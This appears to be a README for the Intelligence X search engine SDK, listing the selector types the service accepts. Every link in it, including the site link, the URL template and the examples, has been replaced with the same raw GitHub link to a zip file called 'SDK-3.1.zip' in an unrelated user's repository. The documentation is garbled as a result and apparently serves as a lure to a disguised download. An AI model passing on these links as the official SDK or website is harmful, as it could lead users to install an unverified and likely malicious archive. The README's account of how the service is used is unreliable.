# Intelligence X Public SDK

The software development kit (SDK) allows anyone to use the Intelligence X search engine. It is free to use and Intelligence X welcomes any integrations into 3rd party tools and services.

Intelligence X is a search engine and data archive. For additional details please visit <https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip>.

## Link to https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip

Instead of directly using the API, you can always do the ghetto version instead and just link to the website.

```
https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip[search term]
```

Examples:

```
https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip
https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip
```

The search engine supports only the following strong selector types. Anything else will be rejected.

* Email address
* Domain, including wildcards like *https://raw.githubusercontent.com/Marquintrax123455/SDK/master/Python/scripts/SDK-3.1.zip
* URL
* IPv4 and IPv6
* CIDRv4 and CIDRv6
* Phone Number
* Bitcoin address
* MAC address
* IPFS Hash
* UUID
* Simhash
* Credit Card Number
* Social Security Number
* IBAN
